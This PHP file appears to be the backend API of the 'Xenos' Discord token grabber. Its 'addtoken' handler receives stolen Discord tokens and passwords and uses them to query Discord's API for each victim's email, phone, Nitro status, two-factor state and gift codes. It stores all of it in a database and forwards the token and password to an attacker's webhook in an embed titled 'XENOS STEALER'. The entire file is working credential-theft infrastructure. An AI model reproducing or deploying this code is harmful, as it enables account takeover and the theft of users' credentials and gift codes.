<?php

    require_once('Inc/fonctions.php');

    // API Return JSON

    $reponse['success'] = false;
    global $webhook, $api_password;

    if(isset($_GET['type']) AND !empty($_GET['type'])) {
        $token = htmlspecialchars($_GET["token"]);
        $type = htmlspecialchars($_GET["type"]);
        if(isset($token) && !empty($token)) {
            if(preg_match("/mfa\.[\w-]{84}/", $token) or preg_match("/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/", $token)) {
                global $bdd;
                if($type == "addtoken") {
                    $getCodes = curl_init();
                    curl_setopt_array($getCodes, array(
                        CURLOPT_URL => "https://discord.com/api/v9/users/@me/outbound-promotions/codes",
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_HTTPHEADER => array(
                            "Authorization: " . $_GET['token']
                        )
                    ));
                    $response = curl_exec($getCodes);
                    curl_close($getCodes);
                    $data = json_decode($response);
                    
                    $codes = "";
                    $locked = 0;
                    $isflag = "\\❌";
                    if(isset($data->message) && $data->message == "You need to verify your account in order to perform this action.") {
                        $locked = 1;
                        $isflag = "\\✔️";
                        $codes = "\\❌";
                    } else {
                        foreach($data as $code) {
                            $check = $bdd->prepare("SELECT * FROM `gifts` WHERE `code` = ?");
                            $check->execute(array(strval($code->code)));
                            $count = $check->rowCount();
                            
                            $codes .= "{$code->promotion->outbound_title}: {$code->code}\n";
                            if($count == 0) {
                                $req = $bdd->prepare("INSERT INTO `gifts`(`gift_name`,`start_date`,`end_date`,`code`,`claim_at`) VALUES (?,?,?,?,?)");
                                $req->execute(array(strval($code->promotion->outbound_title), strval($code->promotion->start_date), strval($code->promotion->end_date), strval($code->code), strval($code->claimed_at)));
                            } else {
                                $req = $bdd->prepare("UPDATE `gifts` SET `gift_name`= ?, `start_date`= ?, `end_date`= ?, `code`= ?, `claim_at`= ? WHERE code = ?");
                                $req->execute(array(strval($code->promotion->outbound_title), strval($code->promotion->start_date), strval($code->promotion->end_date), strval($code->code), strval($code->claimed_at), strval($code->code)));
                            }
                        }
                    }

                    $check = curl_init();
                    curl_setopt_array($check, array(
                        CURLOPT_URL => "https://discordapp.com/api/v9/users/@me",
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_HTTPHEADER => array(
                            "Authorization: " . $_GET['token'],
                            "Content-Type: application/json"
                        )
                    ));
                    $response = curl_exec($check);
                    curl_close($check);
                    $data = json_decode($response);

                    if (isset($data->id) && !empty($data->id)) {
                        $check = $bdd->prepare('SELECT * FROM tokens WHERE `user_id` = ?');
                        $check->execute(array($data->id));
                        $count = $check->rowCount();

                        $user_password = "";
                        if(isset($_GET["password"]) && !empty($_GET["password"])) {$user_password = $_GET["password"];}
                        
                        if($count == 0) {
                            if(strval((bool) $data->phone)) {$phone = $data->phone;} else {$phone = "No Phone";}                            
                            $req = $bdd->prepare("INSERT INTO `tokens`(`user_id`, `username`, `avatar`, `email`, `phone`, `badges`, `nitro_badges`, `twofactor`, `token`, `isflaged`, `password`) VALUES (?,?,?,?,?,?,?,?,?,?,?)");
                            $req->execute(array(strval($data->id),strval($data->username)."#".strval($data->discriminator),strval($data->avatar),strval($data->email),strval($phone),strval($data->flags),intval($data->premium_type ?? 0),strval((bool) $data->mfa_enabled),strval($token), $locked, $user_password));
                            
                            $reponse['success'] = true;
                            $reponse['message'] = 'Token Added to Database.';
                            
                        } else {
                            if(strval((bool) $data->phone)) {$phone = $data->phone;} else {$phone = "No Phone";}
                            $req = $bdd->prepare("UPDATE `tokens` SET  `username` = ?, `avatar` = ?, `email` = ?, `phone` = ?, `badges` = ?, `nitro_badges` = ?, `twofactor` = ?, `token` = ?, `isflaged` = ?, `password` = ? WHERE id = ?");
                            $req->execute(array(strval($data->username)."#".strval($data->discriminator),strval($data->avatar),strval($data->email),strval($phone),strval($data->flags),intval($data->premium_type ?? 0),strval((bool) $data->mfa_enabled),strval($token), $locked, $user_password, strval($data->id)));
                            
                            $reponse['message'] = 'Token already in our Database.';
                        }
                        
                        if ($data->premium_type == 1) {$nitro_type = "\\✔️ Nitro Classic";} 
                        else if ($data->premium_type == 2) {$nitro_type = "\\✔️ Nitro Boost";} else {$nitro_type = "\\❌ No Nitro";}
                        if(strval((bool) $data->mfa_enabled) == true) {$mfa = "\\✔️";} else {$mfa = "\\❌";}
                        if(strval((bool) $data->phone)) {$phone = $data->phone;} else {$phone = "\\❌";}
                        if($codes == "") {$codes = "❌ No Codes Found";}
                        if($user_password == "") {$user_password = "`❌ No Password Sent`";}

                        SendToWebhook($webhook, json_encode(
                            [
                                "username" => "Xenos Grabber",
                                "avatar_url" => "https://github.com/KanekiWeb/Xenos/blob/main/assets/images/xenos.gif?raw=true",
                                "embeds" => [
                                    [
                                        "title" => "\\🐺 __XENOS STEALER__ \\🐺",
                                        "description" => "```\n ```\n> Username: **{$data->username}#{$data->discriminator}**\n> User ID: **{$data->id}**\n> Email Adress: **{$data->email}**\n> Phone: **{$phone}**\n> Nitro: {$nitro_type}\n> Two Factor: {$mfa}\n> Account Flaged: {$isflag}\n\n> Token: `{$token}`\n> Password: {$user_password}\n```\n ```\n> About:\n```\n{$data->bio}```\n> Gift Codes:\n```\n{$codes}\n```\n> Profile Banner:",
                                        "thumbnail" => [
                                            "url" => "https://cdn.discordapp.com/avatars/{$data->id}/{$data->avatar}"
                                        ],
                                        "image" => [
                                            "url" => "https://cdn.discordapp.com/banners/{$data->id}/{$data->banner}"
                                        ],
                                        "footer" => [
                                            "text" => "🐺 UHQ Token Grabber Made with ❤️ by github.com/KanekiWeb/Xenos",
                                            "icon_url" => "https://github.com/KanekiWeb/Xenos/blob/main/assets/images/xenos.gif?raw=true"
                                        ],
                                        
                                    ]
                                ]
                            ]
                        ));
                        
                    } else {
                        $reponse['message'] = 'Please provide a token or check if your token is valid.';
                    }
                } else if ($type == "removetoken") {
                    if(htmlspecialchars($_GET["password"]) == $api_password || CheckLogin()) {
                        $req = $bdd->prepare("DELETE FROM `tokens` WHERE `token` = ?");
                        $req->execute(array($token));
                        
                        $reponse["success"] = true;
                        $reponse['message'] = 'Token deleted from database successfully !';

                    } else {
                        $reponse['message'] = 'I can\'t remove this token, please provide the good password or Login You !';
                    }
                } else {
                    $reponse['message'] = 'Invalid Request type, Please use only addtoken or removetoken.';
                }
            } else {
                $reponse["message"] = "Please provide a token or check if your token is valid.";
            }
        } else {
            $reponse['message'] = 'Please provide a token or check if your token is valid.';
        }

    } else {
        $reponse['message'] = 'Invalid Request type, Please use only addtoken or removetoken.';
    }

    if(isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME'])) {
        header('Location: '. $_SERVER['HTTP_REFERER']); die();
    } else {        
        echo json_encode($reponse);
    }

?>